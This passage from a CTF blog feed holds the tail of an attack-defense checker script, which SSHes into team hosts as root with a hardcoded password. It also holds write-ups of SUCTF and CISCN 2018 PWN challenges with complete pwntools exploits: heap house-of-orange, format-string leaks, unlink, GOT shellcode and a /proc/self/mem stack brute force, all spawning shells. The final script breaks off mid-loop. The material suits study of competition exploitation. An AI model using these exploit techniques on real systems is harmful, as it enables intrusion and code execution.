md5obj = hashlib.md5() tmp = f.read(0x2AB6-0x29D6) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch init : ' + oip + '\n', 'red'),ip=oip) return 0 # menu 0x2AB7 0x2b03 f.seek(0x2AB7,0) f_standard.seek(0x2AB7,0) standard_tmp = f_standard.read(0x2b03-0x2AB7) md5obj = hashlib.md5() tmp = f.read(0x2b03-0x2AB7) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch menu : ' + oip + '\n', 'red'),ip=oip) return 0 f.seek(0x4412,0) flag_str =f.read(22) #print flag_str if flag_str !='/home/tsctf/flag/flag\0': f.close() print_log(colored('[Error] in game-&gt;patch flag path : ' + oip + '\n', 'red'),ip=oip) return 0 f.seek(0x1273,0) f_standard.seek(0x1273,0) standard_tmp = f_standard.read(0x28f0-0x1273) md5obj = hashlib.md5() tmp = f.read(0x28f0-0x1273) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in game-&gt;patch game code : ' + oip + '\n', 'red'),ip=oip) return 0 f.close() return 1def check_thread(round): """ function: cheinvalid literal for int() with base 10:ck every targeted ip """ port = 40111#1022 ipbase = '172.16.20.' team_num = 17 check_result = [] # if not debug: # time.sleep(random.randint(10, 20)) print_log( colored('================= Round %d ==================' % round, "green")) for i in range(1, team_num+1): ip = ipbase + str(i) print_log('check ip: ' + ip) check_count = 0 file_check = 1 for i in range(5): """ check 5 times for every ip, if check fail more than three times, then check result is down """ #ip = "127.0.0.1" #port = 2111 single_check = check(ip, port) if single_check == 0: print_log("[check %d] address: %s result: successful" % (i + 1, ip)) elif single_check == 1: check_count += 1 print_log("[check %d] address: %s result: failed" % (i + 1, ip)) # check shell # to determine whether a team uses common guard try: ssh_shell = ssh(host=ip, port = 1022,user='root', password='GA7E12EH2C3CFEBBD1G4',cache=False) ssh_shell.download(file_path,'./file/'+ip+'.bin') ssh_shell.close() #print os.path.getsize('pwn1') #print CalcMD5("DNS_Server_standard") #print CalcMD5('./file/'+ip+'.bin') if (CalcMD5("DNS_Server_standard")!= CalcMD5('./file/'+ip+'.bin')): if abs(os.path.getsize('DNS_Server_standard') - os.path.getsize('./file/'+ip+'.bin')) &gt; 128: print_log(colored('[Warning] find doubtful patch : ' + ip + '\n', 'red'),ip=ip) if(coding_check_level): file_check = patch_check('./file/'+ip+'.bin',"DNS_Server_standard",ip) else: print_log( colored('[info] file size check ok: ' + ip + '\n', 'green')) except Exception as e: print_log(str(e)) print_log( colored('[Error] cannnot connect %s by ssh' % ip, "yellow")) # upload check result into server if(file_check==1): print_log("[patch_check] address: %s result: successful" %(ip)) else: print_log("[patch_check] address: %s result: failed" %(ip)) print_log("") print check_count,file_check if ((check_count &gt;= 2) | (file_check == 0)): check_result.append(&#123;'tid':ip.split('.')[-1],'qid': '3', 'state': 2&#125;) else: check_result.append(&#123;'tid':ip.split('.')[-1],'qid': '3', 'state': 0&#125;) #print check_result try: #print json.dumps(check_result) upload("http://172.16.123.123/commapi/script/setServiceState", &#123;'result': json.dumps(check_result)&#125;) #print json.dumps(check_result) pass except Exception as e: print_log('[HttpError] cannot connect to http server') print_log(str(check_result)) print_log("")def check_test(): port = 2111 ipbase = '172.16.10.' #ip = '10.210.103.168' check_result = [] check_count = 0 for i in range(5): single_check = check(ip, port) if single_check == 0: print_log("[check %d] address: %s result: successful" % (i + 1, ip)) elif single_check == 1: check_count += 1 print_log("[check %d] address: %s result: failed" % (i + 1, ip)) print_log("") if check_count &gt;= 3: check_result.append(&#123;'ip': '172.16.20.3', 'state': 1&#125;) else: check_result.append(&#123;'ip': '172.16.20.3', 'state': 0&#125;) # check shell # to determine whether a team uses common guard # upload check result into server try: upload("http://172.16.123.123/check_the_player.php", &#123;'result': json.dumps(check_result)&#125;) print json.dumps(check_result) pass except Exception as e: print_log('[HttpError] cannot connect to http server') print_log(str(check_result)) print_log("")if __name__ == '__main__': round = 1 if not os.path.exists('./checkresult/'): os.makedirs('./checkresult/') if not os.path.exists('./file/'): os.makedirs('./file/') while True: thread.start_new_thread(check_thread, (round, )) time.sleep(round_time) # five minutes round += 1'''1. patch heap2. login? 1.2.3. serach4. delete single5. ''' Other线下赛的时候在Checker机制中也发现了许多问题，对于通防的思路还是太窄，好在刚开始比赛的时候用size大小的方法+手工的方法查到了NeSE战队的通防，威逼利诱的情况下后来比赛中没有出现其他通防。 偷偷立个flag：想在这个假期写一套自己的通防框架。]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUCTF 2018部分PWN题复现]]></title>
    <url>%2F2018%2F05%2F29%2Fsuctf2018%2F</url>
    <content type="text"><![CDATA[写论文已经两周了orz，今天终于写完了… SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了.. notenote这题也是被大佬们秒的比较多的题目了，我个人觉得这次PWN出的还是挺好的。 题目分析题目有添加、显示、潘多拉魔盒（？）函数： add： show: pandora box: 可以看出add函数最多可以申请10次（用处不大？），起初初始化程序时申请了两个连续的0x88的块，在pandora box函数中释放，程序不存在修改操作。 漏洞利用漏洞十分明显，在add函数中，对申请堆块的输入使用scanf(“%s”,(&amp;ptr)[i]，显然存在一个堆溢出漏洞，并且对堆块也没有释放操作。看上去让人容易联想起House of orange，其实也是（…） 题目给的库是libc 2.24的，也就是说必须使用_IO_str_jump的方法利用了。 简单的House of orange我曾经发过一篇原理在看雪论坛上，一起食用风味更佳：从BookWriter看house_of_orange原理【新手向】 具体house of orange的手法是用unsorted bin attack将_IO_list_all覆写成unsorted bin 头节点（libc bss段上的main_arena + 88），此时在出错时最终会调用_IO_flush_all函数，具体是程序会从_IO_list_all中取出保存的_IO_FILE_plus指针以虚表的形式调用_IO_flush_all函数。可攻击的点在于_IO_list_all是一个文件指针单链表，当一个指针不满足时会继续执行下一个指针，可以将指针控制到我们可以控制的堆块中（通过修改size），最终伪造_IO_FILE_plus指针内容，劫持控制流。 在libc 2.24中，增加的对_IO_FILE_plus中的虚表进行检查，不允许将虚表指向意外的地方： 1234567891011121314static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123; /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;&#125; 这时，大佬们考虑将虚表指向一个libc已存在的虚表，这样可以绕过检查了，由于虚表里指针调用的函数偏移不同，将虚表劫持后，会执行另一个虚表的其他函数，这个虚表被劫持为_IO_str_jumps，当执行想_IO_flush_all，实际上执行了_IO_str_overflow函数，在这个函数中当可以绕过一些判断时，可以执行一个新的函数， new_buf = (char ) (((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); 这个函数同样是相对调用调用，fp时我们可以控制的内存，其内存参数可以通过size计算得到。 可以看到需要满足的条件时： pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only) new_size &lt; old_blen 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int_IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow)#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 参考simp1e师傅之前关于Hctf-babyprintf题目的利用 ， 可以对参数进行构造： 2 * old_blen + 100 = addr of “/bin/sh” old_blen = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base 构造 (fp)-&gt;_IO_buf_end =（ addr of “/bin/sh” - 100） /2 (fp)-&gt;_IO_buf_base = 0 即可 至于如何构造unsorted bin attack可以通过申请堆块，释放原有的堆块，申请小堆块，溢出写来得到，具体exp如下： EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;context.log_level='debug'debug=0if debug: p = process('./note') libc=ELF('./libc.so')else : libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')p = remote('pwn.suctf.asuri.org',20003)p.recvuntil('Welcome Homura Note Book! ')def add(size,content): p.recvuntil('Choice&gt;&gt;') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Content:') p.sendline(content)def show(index): p.recvuntil('Choice&gt;&gt;') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(): p.recvuntil('Choice&gt;&gt;') p.sendline('3') p.recvuntil('(yes:1)') p.sendline('1')add(16,'1'*16)#2#leak system addressdele()show(0)p.recvuntil('Content:')libc_addr = u64(p.recv(6)+'\x00\x00')offset = 0x7f1b15e2ab78-0x7f1b15a66000libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']sys_addr = libc_base+libc.symbols['system']malloc_hook = libc_base+libc.symbols['__malloc_hook']io_list_all = libc_base+libc.symbols['_IO_list_all']binsh_addr = libc_base+next(libc.search('/bin/sh'))log.info('sys_addr:%#x' %sys_addr)#fake chunkfake_chunk = p64(0x8002)+p64(0x61) #headerfake_chunk += p64(0xddaa)+p64(io_list_all-0x10)fake_chunk += p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)fake_chunk = fake_chunk.ljust(0xa0,'\x00')fake_chunk += p64(sys_addr+0x420)fake_chunk = fake_chunk.ljust(0xc0,'\x00')fake_chunk += p64(0)vtable_addr = malloc_hook-13872#+libc.symbols['_IO_str_jumps']payload = 'a'*16 +fake_chunkpayload += p64(0)payload += p64(0)payload += p64(vtable_addr)payload += p64(sys_addr)payload += p64(2)payload += p64(3) payload += p64(0)*3 # vtablepayload += p64(sys_addr)add(16,payload)#3#gdb.attach(p)p.recvuntil('Choice&gt;&gt;')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x200))p.interactive() noend这道题涉及的主要是非主分配区的分配方式，相关知识、代码分析和调试方法在之前的N1CTF PWN题记录 中提到过。 漏洞分析漏洞存在于main函数中，对于malloc得到的指针，没有检验是否为0，就对size-1的位置写一个0，可以造成一字节的内存任意写 123buf = malloc(size);read(0, buf, size);*((_BYTE *)buf + size - 1) = 0; 但是想要malloc返回为0，需要申请一个巨大的内存块大小，使得正常的main_arena无法处理，在_libc_malloc中有该部分的函数逻辑： 12345678910111213141516171819202122232425262728293031void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125;libc_hidden_def (__libc_malloc) 可以看到，在主分配区返回为空时，会初始化一个非主分配区，即ar_ptr = arena_get_retry (ar_ptr, bytes); ，而在此后，均会使用该非主分配区，而assert断言是在debug模式下起作用的，所以当两个分配区都无法处理时，就会返回一个空指针，造成任意写。 123456789101112131415161718192021arena_get_retry (mstate ar_ptr, size_t bytes)&#123; LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr); if (ar_ptr != &amp;main_arena) &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); /* Don't touch the main arena if it is corrupt. */ if (arena_is_corrupt (&amp;main_arena)) return NULL; ar_ptr = &amp;main_arena; (void) mutex_lock (&amp;ar_ptr-&gt;mutex); &#125; else &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); ar_ptr = arena_get2 (bytes, ar_ptr); &#125; return ar_ptr;&#125; 漏洞利用漏洞利用分为地址泄露和地址劫持两部分。 地址泄露在主分配区和非主分配区里，其实质上的内存分配方式是一样的。由于题目限制，申请内存小于等于0x7f时都会释放，而大于时不会释放。 可以首先分配多个不同大小的fastbin大小的块，会释放并挂到fastbin链中去，再申请一个大块（大于0x78，小于等于0x7f），此时，这个块获取的应该为0x90大小，而释放时会与top合并。合并之后，会触发malloc_consolidate，触发后，fastbin中的较小的堆块由于不和top相连，因此会放到unsorted_bin中一次，最后全部合并后与top合并，造成，top中有部分包含main_arena+88或thread_arena+88的地址，可以再次分配回来造成地址泄露。 劫持执行流在非主分配区中，同样利用内存任意写，对threadarena中保存的top末位地址写0，可使top错位，其中size会落到可以控制的堆块地址中，可通过构造size大小使得可以分配到libc的地址中，劫持\_free_hook为system。具体方法是将堆块分配到__free_hook之前，通过top的性质，将被误作为下一块size的__free_hook写为system+1的地址（需要构造提到的top size），虽然是system+1，但对整体没有影响。因为system的前五条指令是： 123456pwndbg&gt; x /5i system 0x7fdf2f15c6a0 &lt;__libc_system&gt;: test rdi,rdi 0x7fdf2f15c6a3 &lt;__libc_system+3&gt;: je 0x7fdf2f15c6b0 &lt;__libc_system+16&gt; 0x7fdf2f15c6a5 &lt;__libc_system+5&gt;: jmp 0x7fdf2f15c130 &lt;do_system&gt; 0x7fdf2f15c6aa &lt;__libc_system+10&gt;: nop WORD PTR [rax+rax*1+0x0] 0x7fdf2f15c6b0 &lt;__libc_system+16&gt;: lea rdi,[rip+0x145591] # 0x7fdf2f2a1c48 system+1的前五条指令是： 123456pwndbg&gt; x /5i system+1 0x7fdf2f15c6a1 &lt;__libc_system+1&gt;: test edi,edi 0x7fdf2f15c6a3 &lt;__libc_system+3&gt;: je 0x7fdf2f15c6b0 &lt;__libc_system+16&gt; 0x7fdf2f15c6a5 &lt;__libc_system+5&gt;: jmp 0x7fdf2f15c130 &lt;do_system&gt; 0x7fdf2f15c6aa &lt;__libc_system+10&gt;: nop WORD PTR [rax+rax*1+0x0] 0x7fdf2f15c6b0 &lt;__libc_system+16&gt;: lea rdi,[rip+0x145591] # 0x7fdf2f2a1c48 可以发现并没有执行上的影响，再次申请一个小堆块（小于0x50），并在其中写上’/bin/sh\0’就可以拿到shell。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#coding:utf-8from ctypes import *from pwn import *import timedebug=1elf = ELF('./noend')if debug: p= process('./noend') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'c') else: exit(0)def build(size,content): p.sendline(str(size)) time.sleep(0.2) p.send(content) k = p.recvline() return kbuild(0x28,'1'*8)build(0x38,'2'*8)build(0x7f,'a'*8)k = build(0x38,'d'*8) #泄露地址libc.address = u64(k[8:8+8]) - 0x10 - 88 -libc.symbols['__malloc_hook']print '[+] system : ',hex(libc.symbols['system'])p.sendline((str( 0x10 + 87 + libc.symbols['__malloc_hook']))) # 切换到非主分配区time.sleep(0.3)build(0x38,'A'*8)p.clean()build(0x28,'1'*8)build(0x48,'2'*8)build(0x7f,'a'*8)k = build(0x38,'d'*8)thread_arena_addr_top = u64(k[8:8+8])#泄露非主分配区地址print '[+] thread_arena_addr : ',hex(thread_arena_addr_top)target = libc.symbols['system']build(0xf0,p64(target + (libc.symbols['__free_hook'] - thread_arena_addr_top +0x70-0x900 ) )*(0xf0/8))#布置fake top sizep.sendline(str(thread_arena_addr_top+1))#对thread_arena中的top值写末尾一字节time.sleep(0.3)p.sendline()p.recvline()p.clean()time.sleep(1)build(libc.symbols['__free_hook']-(thread_arena_addr_top-0x78+0x900)-0x18,p64(libc.symbols['system']))#将__free_hook劫持为system+1build(0x10,'/bin/sh\0')#free后拿到shell p.interactive() tip对于非主分配区程序的调试，我找到一种相对于简单的方法。 首先利用vmmap指令，找到非主分配区的mmap块位置： 红框中标记的是堆和非主分配区的地址，二者应该是一样大的。 当找到非主分配区地址后，根据libc源码，其中第一块申请的应该是_heap_info结构体，因此，可以看到该结构体内容： 而在该结构体内，其中第一个成员ar_ptr指向的就是非主分配区的arena结构体，与main_arena的结构体是一致的。 注意，在一个thread_arena中仅有一个malloc_state结构体，位于第一个申请的内存块中。 lock2Blind pwn … 本队师傅的EXP如下 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#!/usr/bin/env python# coding=utf-8from pwn import *import itertoolsimport stringimport osdef pwn(offset): # context.log_level = 'DEBUG' p = remote('pwn.suctf.asuri.org', 20001) p.recvuntil('password') p.sendline('123456') def leak_format(start, length): out = '' for i in range(start, start + length): out += '-%%%d$p' % i return out # for i in range(20): # p.recvuntil('cmd:') # format_string = leak_format(2 + 4*i, 4) # p.sendline(format_string) # print p.recvline() def run_cmd(p, cmd): p.recvuntil('cmd:') p.sendline(cmd) def leak_stack(p, index): p.recvuntil('cmd:') p.sendline("%%%d$pAAA" % index) p.recvuntil('cmd:') return int(p.recvuntil('AAA', drop=True), 16) def leak_mem(p, addr): buf = '%7$s' + '=--=' + p64(addr) + 'bb' run_cmd(p, buf) p.recvuntil('cmd:') return p.recvuntil('=--=', drop=True) def write_mem(p, addr, value): if value != 0: buf = ('%%%dc%%7$hn' % value).ljust(8, '=') + p64(addr) + 'bb' else: buf = '%%7$hn'.ljust(8, '=') + p64(addr) + 'bb' run_cmd(p, buf) p.recvuntil('cmd:') def get_codebase(p): code_base = leak_stack(p, 16) &amp; (~0xfff) while True: print hex(code_base) data = leak_mem(p, code_base) if 'ELF' in data: print data break else: code_base -= 0x1000 print 'code_base is ' + hex(code_base) return code_base def dumpmem(offset, length): p = remote('pwn.suctf.asuri.org', 20001) p.recvuntil('password') p.sendline('123456') code_base = get_codebase(p) dump = '' addr = code_base + offset count = 0 while len(dump) &lt; length: count += 1 if '\x0a' in p64(addr): print 'bad addr', hex(addr) addr += 1 dump += '\x00' data = leak_mem(p, addr) data += '\x00' dump += data addr += len(data) print hex(addr) if count % 200 == 0: print dump.encode('hex') p.close() return dump def dumpelf(): for i in range(12): dumpfile = 'dump%02d' % i if os.path.exists(dumpfile): print 'dumpfile %s exists' % dumpfile continue size = 0x400 dump = dumpmem(i*size, size)[:size] print 'dump length is ', len(dump) open(dumpfile, 'wb').write(dump) # dumpelf() # for i in range(2, 20): # try: # print i, hex(leak_stack(i)) # except Exception as e: # print e canary = leak_stack(p, 15) print 'canary is ', hex(canary) p.recvuntil('K ') addr = int(p.recvuntil('--', drop=True), 16) def write_byte(byte): for i in range(8): if byte &gt;&gt; i == 0: break bit = (byte &gt;&gt; i) &amp; 1 write_mem(p, addr + i*4, bit) # for i in range(34, 256): # print i # write_byte(i) # print p.recvline_contains('lock') write_byte(35) p.recvuntil('Box:') func_flag = int(p.recvline().strip('\n'), 16) print 'func_addr is ', hex(func_flag) p.recvuntil('name:') p.sendline('aaaaaaaaaa') # p.sendline('a'*offset + p64(canary) + p64(func_addr)) p.recvuntil('want?') p.sendline('b'*0x1A + p64(canary)*2 + p64(func_flag)*10) p.interactive()for i in range(1): pwn(i) heapEXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *context.log_level='debug'debug = 0free_got=0x602018ptr=0x6020c0if debug: p = process('./offbyone') libc = ELF('./libc.so')else: p= remote('pwn.suctf.asuri.org',20004) libc = ELF('./libc-2.23.so')def add(size,data): p.recvuntil('4:edit\n') p.sendline('1') p.recvuntil('input len\n') p.sendline(str(size)) p.recvuntil('input your data\n') p.send(data)def dele(index): p.recvuntil('4:edit\n') p.sendline('2') p.recvuntil('input id\n') p.send(str(index))def show(index): p.recvuntil('4:edit\n') p.sendline('3') p.recvuntil('input id\n') p.send(str(index))def edit(index,data): p.recvuntil('4:edit\n') p.sendline('4') p.recvuntil('input id\n') p.sendline(str(index)) p.recvuntil('input your data\n') p.send(data) add(136,'hack by 0gur1'.ljust(136,'a'))#0add(128,'hack by 0gur2'.ljust(128,'b'))#1add(128,'/bin/sh')#2add(128,'/bin/sh')#3add(128,'hack by 0gur1'.ljust(128,'d'))#4add(136,'hack by 0gur1'.ljust(136,'e'))#5add(128,'hack by 0gur1'.ljust(128,'f'))#6add(128,'hack by 0gur1'.ljust(128,'g'))#7fake_chunk = 'a'*8+p64(0x81) +p64(ptr+40-24)+p64(ptr+40-16)payload= fake_chunkpayload= payload.ljust(0x80,'a')payload+=p64(0x80)payload+='\x90'edit(5,payload)dele(6)edit(5,'\x18\x20\x60')#gdb.attach(p)show(2)free_addr = u64(p.recv(6)+'\x00\x00')sys_addr = free_addr-(libc.symbols['free']-libc.symbols['system'])log.info('sys_addr:%#x' %sys_addr)#gdb.attach(p)edit(2,p64(sys_addr))dele(3)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解]]></title>
    <url>%2F2018%2F05%2F13%2Fciscn-ctf-2018%2F</url>
    <content type="text"><![CDATA[​ 拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤… 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。 ​ 最后做出来和复现的有三道：note-service2 、 house_of_grey 、 echo_back note-service2这道题给出的hint是 漏洞分析大致分析了一下题目，题目主要提供了add、delete两个函数： 可能很多人发现的是delete函数那里悬垂指针可被double free的漏洞，但是此题这个漏洞貌似并没有太大的用处，此题存在的问题是，在add函数中输入index时当index是负数或者一个大于预留数组的size可以越界写的问题。并且，此题对got表没有开启RELRO保护，且也没有开启NX保护，这样可以输入负数，覆写got表函数地址，劫持到我们申请的堆块上去执行。换句话说这题只是一道写shellcode的题目，由于之前刷过pwnable.tw，认出了这题是Alive Note这题，这题在pwnable.tw上是32位的题目，并且限制了仅能输入0~9A~Za~z。貌似CISCN是改成了64位。 漏洞利用具体思路我曾经写过blog： http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...） 思路是利用malloc申请堆块的规律，虽然只能写很少的shellcode，但是可以利用jmp等跳转语句直接跳转到下一块堆块去执行，最终利用系统调用syscall拿到shell，此题我预先在第一块堆块上部署好了”/bin/sh”，劫持了free@got，此时rdi指向这个/bin/sh节省了不少步骤。 EXP123456789101112131415161718192021222324252627282930313233343536from pwn import *from ctypes import *debug = 0elf = ELF('./task_note_service2_OG37AWm')context.update(arch = 'amd64')#ciscn&#123;93707fa0f2eca125f3998d0c6fb1a932&#125;if debug: p = process('./task_note_service2_OG37AWm') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('117.78.43.123', 31128) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(index,content): p.recvuntil('your choice&gt;&gt;') p.sendline('1') p.recvuntil('index') p.sendline(str(index)) p.recvuntil('size') p.sendline(str(8)) p.recvuntil('content') p.send(content)add(0,'/bin/sh')add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xe9\x16')add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xe9\x16')add(2,asm('xor rdx,rdx')+'\x90\x90\xe9\x16')add(3,asm('syscall')+'\x90'*5)p.recvuntil('choice')p.sendline('4')p.recvuntil('index')p.sendline('0')p.interactive() house_of_grey漏洞分析此题的逻辑比较复杂，在main函数中首先利用mmap函数分配了一块内存，再利用clone函数，以mmap动态分配的内存作为栈基址，具体启动了fn函数 在fn函数中首先利用系统沙箱禁止了大部分的系统调用，然后主要提供了4个函数。 漏洞存在于case 1中，在设置文件名称是存在溢出漏洞，可以覆盖v8变量，而v8正是case 4中read的第二个参数，因此总体来说存在内存任意写漏洞。 漏洞利用首先，可以通过读/proc/self/maps来获取各程序段的内存地址，起初以为这样就可以知道全部的内存地址，包括新启动的进程栈地址。 但在实际尝试过程中，发现fn函数的栈底并不是mmap得到内存块的结束地址，而是在其内部还有随机化。 另外还在困惑，在任意写时到底应该写在哪里… w1tcher提示我最终利用exit返回，可以劫持这个流程，但是我头铁决定将case 4中的read参数劫持到read函数的返回地址处，也就是是read自身覆写自身的返回地址… 这样在read函数结束时也就返回到了通过写入的rop中。 这种想法遇到的一个问题是如何拿到随机化的栈地址？ 此时想到另外一个文件/proc/self/mem，这个文件相当于程序内存的一个映射。在测试过程中发现，其栈起始地址与mmap内存块的结束地址相差了一个随机值，而这个随机值是有一定范围的：0xf000000~0xfffffff之间，是可以爆破的，而爆破的过程是，首先利用case 2的定位函数，预先设定一个读取内存地址的起始值，然后不断的向下读，由于程序栈中存在一个明显的字符串标识”/proc/self/mem”，当读到的数据中包含这个字符串时就可以判断找到了栈。 可以简单验证一下可行性，爆破的次数最多可以有24次（共可以进行30次操作，其他操作占有次数），24*100000 = 2400000 = 0x249f00 ， 而可能的范围是0x1000000 其概率为0.1430511474609375，是可以接受的。 另外此题的坑点还有系统调用的限制，最终可以通过open(‘/home/ctf/flag’) read(6,buf,0x100) puts(buf)读出。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *from ctypes import *debug = 0elf = ELF('./task_house_P4U73bf')#ciscn&#123;57de0cd00899090b7193b2a99508e6db&#125;if debug: p = process('./task_house_P4U73bf') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('117.78.43.123', 32619) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #off = 0x001b0000 context.log_level = 'debug'p.recvuntil('Y/n')p.sendline('y')p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/maps')p.recvuntil('Exit')p.sendline('3')p.recvuntil('get?')p.sendline('10000')p.recvuntil('something:\n')pie = int('0x'+p.recvuntil('-')[:-1],16)print '[+] pie:',hex(pie)while 1: a = p.recvline() if 'heap' in a: a = p.recvline() stack_start = int(a.split('-')[0],16) stack_end = int((a.split('-')[1]).split(' ')[0],16) print '[+] stack_start:',hex(stack_start) print '[+] stack_end:',hex(stack_end) breakwhile 1: a = p.recvline() if 'libc' in a: libc.address = int(a.split('-')[0],16) print '[+] system:',hex(libc.symbols['system']) breakcanary = 0p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/mem')p.recvuntil('Exit')p.sendline('2')p.recvuntil('you?')stack_guess = 0xf800000p.sendline(str(stack_end - stack_guess - 24*100000))print '[+] offset from ',hex( stack_guess + 24*100000),'to',hex(stack_guess)print '[+] from ',hex(stack_end - stack_guess - 24*100000),'to',hex(stack_end - stack_guess)for i in range(0,24): 